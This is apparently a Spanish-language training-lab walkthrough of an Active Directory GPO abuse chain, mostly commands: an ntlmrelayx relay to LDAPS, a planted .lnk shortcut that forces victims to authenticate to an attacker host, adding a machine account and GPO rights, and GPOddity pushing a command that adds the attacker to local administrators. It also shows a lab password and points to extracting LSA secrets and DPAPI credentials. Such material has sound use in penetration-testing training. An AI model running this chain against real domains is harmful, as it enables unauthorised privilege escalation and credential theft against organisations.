## Abuso de GPO
Si obtenemos una *shell LDAP* mediante *ntlmrelayx*, podremos modificar determinados objetos de Active Directory. Un abuso habitual consiste en añadir un equipo controlado por nosotros a una GPO sobre la que tengamos permisos de escritura, para posteriormente modificar dicha política y ejecutar comandos con privilegios.

Este ataque puede encadenarse con la ejecución automática de accesos directos (.lnk) desde un recurso compartido para forzar la autenticación de una víctima.

> **Nota:** Antes de comenzar, necesitaremos conocer el GUID de la GPO que vamos a abusar.

#### Obtener el GUID de la GPO
Primero identificamos las GPO aplicadas al equipo que contiene el recurso compartido.
```
Get-DomainGPO -ComputerIdentity DCORP-CI
```

Después obtenemos el GUID de la política que queremos modificar.
```
Get-DomainGPO -Identity "DevOps Policy"
```

#### Iniciar ntlmrelayx
Accederemos al WSL (*WSLToTh3Rescue!*) y ejecutaremos la herramienta *ntlmrelayx*
```shell
sudo ntlmrelayx.py -t ldaps://172.16.2.1 -wh 172.16.100.x --http-port '80,8080' -i --no-smb-server
```

#### Crear acceso directo .lnk
En nuestra maquina deberemos de crear un acceso directo *.lnk* que fuerce una autenticación HTTP utilizando las credenciales del usuario que las ejecute
```shell
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command "Invoke-WebRequest -Uri 'http://172.16.100.X' -UseDefaultCredentials"
```

Deberemos copiarlo al recurso sobre el que podemos escribir
```sehll
xcopy C:\AD\Tools\studentx.lnk \\dcorp-ci\AI
```

Cuando un usuario lo ejecute podremos conectarnos mediante la shell *LDAP* que se levanta
```shell
nc 127.0.0.1 11000
```
#### Añadir un nuevo equipo
Deberemos de crear un nuevo equipo 
```shell
add_computer stdX-gpattack Secretpass@123
```

Y añadir este equipo a la *ACL* de la *GPO* para obtener permisos sobre ella
```shell
write_gpo_dacl stdX-gpattack$ {0BF8D01C-1F62-4BDC-958C-57140B67D147}
```

Una vez ejecutado eso deberemos de detener la shell de *LDAP* y de *ntlmrelayx*

#### Modificar la GPO con GPOddity
En WSL desplazarnos al directorio donde tenemos guardado *GPOditty*
```shell
cd /mnt/c/AD/Tools/GPOddity
```

Y ejecutar la herramienta indicando la GPO objetivo y el comando que queremos desplegar
```shell
sudo python3 gpoddity.py --gpo-id '0BF8D01C-1F62-4BDC-958C-57140B67D147' --domain 'dollarcorp.moneycorp.local' --username 'studentx' --password 'gG38Ngqym2DpitXuGrsJ' --command 'net localgroup administrators studentx /add' --rogue-smbserver-ip '172.16.100.x' --rogue-smbserver-share 'stdx-gp' --dc-ip '172.16.2.1' --smb-mode none
```

#### Preparar el recurso compartido
Desde otra sesión *WSL* crearemos el directorio que actuara como recurso compartido
```shell
mkdir /mnt/c/AD/Tools/stdx-gp
```

Y copiaremos el contenido generado por *GPOddity* 
```shell
cp -r /mnt/c/AD/Tools/GPOddity/GPT_Out/* /mnt/c/AD/Tools/stdx-gp
```

Desde una CMD como Administrador debemos de compartir la carpeta
```shell
net share stdX-gp=C:\AD\Tools\stdX-gp /grant:Everyone,Full
icacls "C:\AD\Tools\stdX-gp" /grant Everyone:F /T
```

Y verificar si la carpeta esta dentro de la política
```shell
Get-DomainGPO -Identity 'DevOps Policy'
```

Si la política se ha aplicado correctamente podremos acceder a la maquina
```shell
winrs -r:dcorp-ci cmd
```

Se pueden extraer credenciales de:

- LSA Secrets/SECURITY hive - Service account passwords, Credenciales en cache del dominio
- DPAPI Protectected Credentials
